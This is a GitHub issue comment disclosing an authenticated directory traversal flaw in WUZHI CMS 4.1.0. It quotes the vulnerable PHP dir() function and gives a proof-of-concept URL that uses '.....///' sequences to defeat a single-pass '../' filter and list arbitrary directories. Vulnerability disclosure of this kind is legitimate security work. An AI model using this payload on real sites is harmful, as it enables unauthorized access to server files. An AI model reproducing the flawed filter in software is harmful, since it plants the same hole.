### **[f4s1on](/f4s1on)** commented [Jul 12, 2022](#issue-1301479795)

| A directory traversal vulnerability was discovered in WUZHI CMS 4.1.0. Directory traversal allows authenticated remote attackers to list files in any directory. Vulnerability in /coreframe/app/attachment/admin/index.php:  ```     public function dir()     {         $dir = isset($GLOBALS['dir']) && trim($GLOBALS['dir']) ? str_replace(array('..\\', '../', './', '.\\'), '', trim($GLOBALS['dir'])) : '';         $dir = str_ireplace(array('%2F', '//'), '/', $dir);         $lists = glob(ATTACHMENT_ROOT . $dir . '/' . '*');         if (!empty($lists)) rsort($lists);         $cur_dir = str_replace(array(WWW_ROOT, DIRECTORY_SEPARATOR . DIRECTORY_SEPARATOR), array('', DIRECTORY_SEPARATOR), ATTACHMENT_ROOT . $dir . '/');         include $this->template('dir', M);     }  ```  Even if the "str\_replace" function filters some characters, it can still bypass the blacklist with ".....///"  1.Log in as admin [image](https://user-images.githubusercontent.com/57355558/178397342-0e5ccd4b-96fa-4e49-ba26-f0be3be4bad3.png) 2.Vulnerability trigger point `http://www.test.com/index.php?m=attachment&f=index&_su=wuzhicms&v=dir&dir=/.....///.....///.....///.....///` [image](https://user-images.githubusercontent.com/57355558/178397270-731377d4-cb82-421a-bce0-597b02eebf67.png) |
